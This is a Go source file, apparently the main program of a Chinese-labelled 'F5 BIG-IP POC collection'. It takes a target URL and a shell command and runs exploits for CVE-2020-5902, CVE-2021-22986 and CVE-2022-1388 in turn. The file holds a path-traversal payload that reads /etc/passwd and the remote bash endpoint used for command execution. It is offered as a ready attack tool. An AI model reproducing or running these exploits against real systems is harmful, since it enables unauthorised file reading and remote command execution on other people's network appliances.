package main

import (
	"flag"
	"fmt"
)

var (
	method    string
	url       string
	c         string
	filepath  = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
	filepath1 = "/mgmt/tm/util/bash"
)

func init() {
	flag.StringVar(&url,
		"u",
		"url",
		"url:https://127.0.0.1/",
	)
	flag.StringVar(&c,
		"c",
		"id",
		"command",
	)

}
func main() {
	flag.Parse()
	fmt.Println("F5 BIG-IP POC合集")
	fmt.Println("author:160team.west9b")
	if url != "url" {
		fmt.Println("\n-----------------------✂---------------------------")
		Cve_2020_5902()
		fmt.Println("\n-----------------------✂---------------------------")
		Cve_2021_22986()
		fmt.Println("\n-----------------------✂---------------------------")
		Cve_2022_1388()
		return
	} else {
		fmt.Println("输入正确的URL地址:usage: ./F5-BIG-IP  -u url")
	}

}
